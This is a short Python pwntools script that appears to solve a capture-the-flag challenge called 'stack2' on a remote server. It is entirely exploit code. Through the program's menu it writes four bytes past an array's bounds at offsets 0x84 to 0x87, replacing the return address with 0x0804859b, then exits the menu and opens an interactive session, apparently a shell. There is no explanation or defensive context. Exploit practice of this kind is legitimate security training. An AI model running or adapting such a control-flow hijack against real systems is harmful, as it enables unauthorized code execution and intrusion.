from pwn import *
#p = process('./stack2')
p = remote('111.198.29.45','39900')
#gdb.attach(p,"b *0x0804868D")
write_addr = 0xffffd05c
target_addr = [0x9b,0x85,0x04,0x08]

p.recv()
p.sendline("1")
p.recv()
p.sendline("1")
p.recv()
for i in range(4):
	p.sendline("3")
	p.recv()
	p.sendline(str(0x84+i))
	p.recv()
	p.sendline(str(target_addr[i]))



p.recv()
p.sendline("5")
p.interactive()
